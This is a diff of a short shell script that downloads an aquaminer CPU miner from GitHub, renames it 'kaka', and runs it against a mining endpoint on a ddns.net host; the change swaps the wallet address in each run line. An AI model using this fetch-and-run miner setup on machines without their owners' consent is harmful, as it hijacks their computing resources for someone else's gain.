@@ -15,13 +15,13 @@ if [ -f ${PWD}/kaka ]; then
 then
 pkill kaka
 echo " kill process"
-./kaka -F http://ohmygodguru.ddns.net:56789/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/ggco
+./kaka -F http://ohmygodguru.ddns.net:56789/0x6f392f86702e358b16074ad635f9b273b44972c1/ggc
 
     
 else
 
 echo "Miner da install , chay thoi "
-./kaka -F http://ohmygodguru.ddns.net:56789/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/ggco
+./kaka -F http://ohmygodguru.ddns.net:56789/0x6f392f86702e358b16074ad635f9b273b44972c1/ggc
 
      
 fi
@@ -31,5 +31,5 @@ fi
 wget https://github.com/StupidmanTan/miner-cpu/raw/master/aquaminer-0.4-linux-amd64.zip
 unzip aquaminer-0.4-linux-amd64.zip
 mv aquaminer-0.4-linux-amd64 kaka
-./kaka -F http://ohmygodguru.ddns.net:56789/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/ggco
+./kaka -F http://ohmygodguru.ddns.net:56789/0x6f392f86702e358b16074ad635f9b273b44972c1/ggc
 exit 0
